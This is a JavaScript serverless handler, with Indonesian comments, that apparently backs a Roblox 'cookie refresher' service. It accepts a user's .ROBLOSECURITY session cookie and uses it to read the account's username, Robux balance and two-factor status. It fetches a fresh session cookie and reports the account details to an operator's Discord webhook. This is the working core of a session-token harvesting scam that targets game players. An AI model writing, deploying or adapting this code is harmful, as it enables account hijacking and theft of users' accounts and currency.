export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { cookie } = req.body;
  if (!cookie || !cookie.includes('_|WARNING')) {
    return res.status(400).json({ error: 'Format cookie tidak valid.' });
  }

  try {
    const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };

    // 1. Ambil info akun
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
    if (!userRes.ok) return res.status(401).json({ error: 'Cookie kedaluwarsa atau tidak valid.' });
    const user = await userRes.json();

    // 2. Ambil Robux
    const economyRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, { headers });
    const economy = economyRes.ok ? await economyRes.json() : { robux: 0 };

    // 3. Ambil Status 2FA
    let twoFA = 'Tidak Diketahui';
    try {
      const authRes = await fetch('https://auth.roblox.com/v2/settings', { headers });
      if (authRes.ok) {
        const authData = await authRes.json();
        twoFA = authData.twoStepVerificationEnabled ? 'Aktif ✅' : 'Nonaktif ❌';
      }
    } catch (e) {}

    // 4. Refresh Cookie
    const homeRes = await fetch('https://www.roblox.com/home', { headers, redirect: 'manual' });
    const setCookie = homeRes.headers.get('set-cookie') || '';
    const match = setCookie.match(/\.ROBLOSECURITY=([^;]+)/);
    const newCookie = match ? match[1] : cookie;

    // 5. Kirim ke Discord
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    if (webhookUrl) {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: '✅ Akun Berhasil Di-refresh',
            color: 0x3ddc97,
            thumbnail: { url: `https://www.roblox.com/headshot-thumbnail/image?userId=${user.id}&width=150&height=150&format=png` },
            fields: [
              {name:'Username', value: user.name, inline:true},
              {name:'Robux', value: String(economy.robux || 0), inline:true},
              {name:'2FA', value: twoFA, inline:true}
            ],
            timestamp: new Date().toISOString()
          }]
        })
      }).catch(() => {});
    }

    return res.status(200).json({
      newCookie: newCookie,
      account: {
        username: user.name,
        displayName: user.displayName,
        id: user.id,
        robux: economy.robux || 0,
        twoFA: twoFA
      }
    });

  } catch (error) {
    return res.status(500).json({ error: 'Server error.' });
  }
}
